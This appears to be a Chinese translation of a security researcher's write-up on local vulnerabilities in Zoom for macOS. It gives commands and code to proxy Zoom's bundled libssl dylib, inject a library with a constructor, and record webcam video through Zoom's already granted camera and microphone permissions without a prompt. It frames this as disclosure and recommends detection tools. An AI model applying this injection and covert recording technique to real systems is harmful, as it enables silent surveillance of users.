### 优化后的文本

---

**路径：** `/System/Library/Frameworks/CoreServices.framework/Versions/A/CoreServices`

由于macOS的系统完整性保护（SIP），我们无法替换任何系统库。因此，如果希望对某个应用程序使用dylib代理，必须满足以下条件：
- 程序必须从其自身的包或另一个不受SIP保护的位置加载一个库。
- 该库必须未经“hardened runtime”编译，除非它有`com.apple.security.cs.disable-library-validation`权限。

以Zoom为例，通过观察其库依赖关系，可以发现`[@rpath]/curl64.framework/Versions/A/curl64`。使用`otool -l`工具解析运行路径（[@rpath]）：

```sh
$ otool -l /Applications/zoom.us.app/Contents/MacOS/zoom.us 
...
Load command 22
          cmd LC_RPATH
      cmdsize 48
         path @executable_path/../Frameworks (offset 12)
```

`@executable_path`在运行时将解析为二进制文件的路径，因此dylib将从以下位置加载：`/Applications/zoom.us.app/Contents/MacOS/../Frameworks`，即`/Applications/zoom.us.app/Contents/Frameworks`。

确认Zoom的应用程序包中存在`curl`以及其他框架和库，并且它们会在Zoom启动时加载。更多关于`[@rpath]`、`executable_path`和代理dylib的信息，请参阅[“Dylib Hijacking on OS X”](https://www.virusbulletin.com/pdf/magazine/2015/vb201503-dylib-hijacking.pdf)。

为了简化操作，我们将Zoom的`libssl.1.0.0.dylib`（因为它是一个独立的库，而不是框架/包）作为我们要代理的目标库。

首先，重命名合法库，例如在其文件名前加一个前缀：`_libssl.1.0.0.dylib`。

此时，运行Zoom会导致崩溃，因为缺少必要的库（`libssl.1.0.0.dylib`）：

```sh
patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us 
dyld: Library not loaded: @rpath/libssl.1.0.0.dylib
Referenced from: /Applications/zoom.us.app/Contents/Frameworks/curl64.framework/Versions/A/curl64
Reason: image not found
Abort trap: 6
```

这意味着，如果我们放置一个名为`libssl.1.0.0.dylib`的库在Zoom的Frameworks目录下，dyld将会尝试加载它。

接下来，创建一个简单的库，并添加自定义构造函数（在加载库时自动调用）：

```c
__attribute__((constructor))
static void constructor(void) {
    char path[PROC_PIDPATHINFO_MAXSIZE];
    proc_pidpath(getpid(), path, sizeof(path) - 1);
    NSLog(@"zoom zoom: loaded in %d: %s", getpid(), path);
    return;
}
```

将其保存至`/Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib`。

重新运行Zoom：

```sh
patrick$ /Applications/zoom.us.app/Contents/MacOS/zoom.us 
zoom zoom: loaded in 39803: /Applications/zoom.us.app/Contents/MacOS/zoom.us
```

可以看到我们的库被Zoom成功加载，但由于我们的`libssl.1.0.0.dylib`不是一个真正的SSL库，提供不了任何程序需要的功能，所以Zoom无法启动。

为此，我们需要使用dylib代理技术。通过链接器指令，告诉Zoom虽然我们的库没有实现必需的SSL功能，但我们知道哪个库可以提供这些功能。然后将Zoom指向原始（合法）的SSL库（即重命名为`_libssl.1.0.0.dylib`的库）。

在Xcode的“Other Linker Flags”下添加`-XLinker -reexport_library`，并指定目标代理库的路径。使用`install_name_tool`更新嵌入式重导出路径：

```sh
patrick$ install_name_tool -change @rpath/libssl.1.0.0.dylib /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib  /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib
```

现在，通过`otool`确认我们的代理库引用了原始的SSL库：

```sh
patrick$ otool -l /Applications/zoom.us.app/Contents/Frameworks/libssl.1.0.0.dylib 
...
Load command 11
          cmd LC_REEXPORT_DYLIB
      cmdsize 96
         name /Applications/zoom.us.app/Contents/Frameworks/_libssl.1.0.0.dylib
 time stamp 2 Wed Dec 31 14:00:02 1969
current version 1.0.0
compatibility version 1.0.0
```

重新运行Zoom，确认我们的代理库和原始SSL库均已加载，且Zoom可以正常运行！

注入恶意库代码的魅力在于其（用户授予的）对麦克风和摄像头的访问权限。将我们的恶意库加载到Zoom的进程/地址空间后，该库将自动继承Zoom的所有访问权限。

如果用户已授予Zoom访问麦克风和摄像头的权限，则我们注入的库也拥有相同的访问权限。如果尚未授予权限，我们的恶意库可以检测到该情况并作出反应，或者继续尝试访问设备，因为访问提示将从Zoom发出，很可能由不知情的用户批准。

为了测试这种“访问权限的继承”，向注入的库中添加一些代码来录制几秒钟的网络摄像头视频：

```objc
AVCaptureDevice* device = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
session = [[AVCaptureSession alloc] init];
output = [[AVCaptureMovieFileOutput alloc] init];

AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:nil];
movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];

[self.session addInput:input];
[self.session addOutput:output];
[self.session addOutput:movieFileOutput];
[self.session startRunning];

[movieFileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"zoom.mov"] recordingDelegate:self];

// 停止录制
[NSTimer scheduledTimerWithTimeInterval:5 target:self selector:@selector(finishRecord:) userInfo:nil repeats:NO];
```

在正常情况下，此代码会触发来自macOS的警报，要求用户确认对麦克风和摄像头的访问。但是，当我们将其注入Zoom（已由用户确认访问）时，将不会显示其他提示，并且注入的代码可以任意录制音频和视频。

这项测试揭示了Zoom在隐私和安全方面的潜在问题。恶意软件可以在任意时间使用Zoom捕获音频和视频（即监视用户）。如果安装了Zoom并被授予访问麦克风和摄像头的权限，那么答案显而易见：可以！同时，可以通过`/usr/bin/open -j`将程序隐藏起来。

## 总结

我们发现了两个影响Zoom（macOS版本）本地安全的漏洞。鉴于Zoom一直以来在隐私和安全方面的不良表现，这也是在意料之中。

首先，我们展示了无特权攻击者或恶意软件如何利用Zoom的安装器获取root权限。其次，由于特殊的权限，我们成功展示了如何将恶意库注入到Zoom的受信任进程上下文中。这使得恶意软件能够记录所有Zoom会议，甚至是在后台启动Zoom的情况下，能够在任意时间访问用户的麦克风和网络摄像头！

前者的问题在于许多企业（现在）使用Zoom进行敏感的商务会议，而后者的问题在于即使没有macOS警报或提示，恶意软件仍然可以秘密地访问麦克风或网络摄像头。

### 解决方法

如果您关心自己的安全或隐私，可以考虑停止使用Zoom。如果必须使用Zoom，可以使用我编写的一些免费工具来帮助检测这些攻击。

- **OverSight**：可以在任何人任何时间访问您的麦克风和摄像头时提醒您。即使攻击者或恶意软件在后台运行Zoom，OverSight也会生成警报。
- **KnockKnock**：可以检测代理库。

更多详细信息，请参阅[OverSight](https://objective-see.com/products/oversight.html)和[KnockKnock](https://objective-see.com/products/knockknock.html)。

---